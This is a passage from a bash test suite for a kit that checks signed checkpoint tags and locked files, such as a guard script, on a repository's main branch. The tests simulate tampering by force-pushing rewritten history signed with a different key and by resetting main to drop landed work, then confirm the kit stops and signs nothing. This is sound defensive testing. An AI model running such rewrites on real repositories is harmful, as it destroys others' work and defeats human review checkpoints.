(cd "$W/m" && git fetch -q origin && git reset -q --hard "$(git -C "$R" rev-parse 'refs/tags/loop-checkpoint-0^{commit}')" && echo q >docs/q.md && git add -A && git -c gpg.format=openpgp -c user.signingkey="$OTHER" commit -qS -m rewritten && FAKE_SERVER=1 git push -qf origin HEAD:main)
C y; chk "rewritten history stops it" "$(has "$out" 'history was rewritten')" 1; restore
server 'echo lost >>docs/lost.md' "U-064: will vanish (#0)"; C n; lost="$(og rev-parse refs/heads/main)"
og update-ref refs/heads/main "$good"; server 'echo other >>docs/other.md' "U-065: takes its place (#0)"
C y; chk "work of the loop that vanishes stops it too, though only this clone's memory of main can tell" "$(has "$out" "main no longer contains $lost, which this clone has seen there")" 1; restore
echo "# hardened" >>loop/guard.sh; L y --reviewed "harden guard"; chk "(you land a hardening of guard.sh)" "$(has "$out" LANDED)" 1; good="$(og rev-parse refs/heads/main)"
tags="$(git tag --list | wc -l | tr -d ' ')"
og update-ref refs/heads/main "$anchor"; server 'echo free >>docs/free.md' "U-063: fine (#0)"
C y; chk "main is set back to the checkpoint and built anew without your change: it stops" "$(has "$out" "main no longer contains $good, which this clone has seen there: history was rewritten")" 1
C y; chk "and stops again: your own branch remembers" "$(has "$out" 'history was rewritten')" 1
rm -rf "$W/wc2"; git clone -q -b main "file://$W/origin.git" "$W/wc2"; (cd "$W/wc2" && git config user.signingkey "$ME" && printf 'y\n' | "$K/checkpoint.sh" 2>&1) >"$W/o2"
chk "a clone that never saw your change is stopped by your kit, before the question" "$(grep -c 'CHECKPOINT STOP: the locked files on main are not the ones in your kit' "$W/o2") $(grep -c '^    differs: loop/guard.sh' "$W/o2") $(grep -c 'Sign loop-checkpoint' "$W/o2")" "1 1 0"
chk "it points to the incident procedure, not to a rebuild of the kit" "$(grep -c "section 8, 'If something locked changed without you'" "$W/o2") $(grep -c 'Rebuild the kit' "$W/o2")" "1 0"
chk "nothing was signed, in either clone" "$(git tag --list | wc -l | tr -d ' ') $(git -C "$W/wc2" tag --list | tr '\n' ' ')" "$tags $(git describe --exact-match --tags "$anchor") "; restore
C y; chk "with your change back on main, the checkpoint is signed" "$(has "$out" 'signed loop-checkpoint-')" 1
git tag -s loop-checkpoint-10000 refs/remotes/origin/main -m "signed by hand"; C; chk "a checkpoint whose number has five digits is still taken for yours" "$(has "$out" 'nothing new since loop-checkpoint-10000')" 1
chk "from first to last, GitHub never held a tag" "$(og for-each-ref refs/tags | wc -l | tr -d ' ')" 0
chk "(and to the last, push.followTags and log.showSignature were switched on in your git settings)" "$(git config --global push.followTags) $(git config --global log.showSignature)" "true true"

# ---------------------------------------------------------------- however it is started
echo "## however a script is started"
mkdir -p "$W/sh"; ln -s "$(command -v bash)" "$W/sh/sh"
"$W/sh/sh" "$K/preflight.sh" >/dev/null 2>&1; chk "as 'sh script' where sh is bash in POSIX mode, as on macOS" $? 0
if command -v dash >/dev/null; then dash "$K/preflight.sh" >/dev/null 2>&1; chk "as 'dash script'" $? 0; fi
if command -v zsh >/dev/null; then zsh "$K/preflight.sh" >/dev/null 2>&1; chk "as 'zsh script'" $? 0; zsh -c "$K/preflight.sh" >/dev/null 2>&1; chk "from a zsh prompt" $? 0; fi
if [ -z "${SUITE_INNER:-}" ]; then # this suite, started on folders that hold something
  mkdir -p "$W/yours" "$W/empty"; echo keep >"$W/yours/notes.txt"
  out="$(unset SUITE_GNUPGHOME; SUITE_INNER=1 SUITE_DIR="$W/yours" "$K/test/suite.sh" 2>&1)"; chk "SUITE_DIR with something in it: this suite refuses to start" "$? $(has "$out" 'Choose a new, empty path')" "2 1"
  out="$(SUITE_INNER=1 SUITE_DIR="$W/empty" SUITE_GNUPGHOME="$W/yours" "$K/test/suite.sh" 2>&1)"; chk "and so with SUITE_GNUPGHOME" "$? $(has "$out" 'Choose a new, empty path')" "2 1"
  chk "what was in there is still there" "$(cat "$W/yours/notes.txt")" keep
fi
echo
echo "RESULT: $pass passed, $bad wrong"
[ "$bad" = 0 ]
